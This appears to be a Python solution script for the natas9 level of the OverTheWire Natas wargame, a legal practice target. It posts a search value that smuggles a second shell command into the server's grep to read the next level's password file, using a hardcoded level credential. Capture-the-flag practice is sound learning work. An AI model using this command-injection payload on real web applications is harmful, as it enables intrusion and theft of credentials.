import requests
import re #regular expressions

username = "natas9"
password = "UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9"

url = 'http://%s.natas.labs.overthewire.org' % username

injection="67 dictionary.txt ; cat /etc/natas_webpass/natas10 ; grep 67"
data={"needle":injection,"submit":"Search"}

session = requests.Session() #Maintains a session
#response = session.get(url , auth=(username, password))
response = session.post(url , auth=(username, password), data=data)
content = response.text

#print (content)
print (re.findall("<pre>\n(.*)\n</pre>",content)[0])
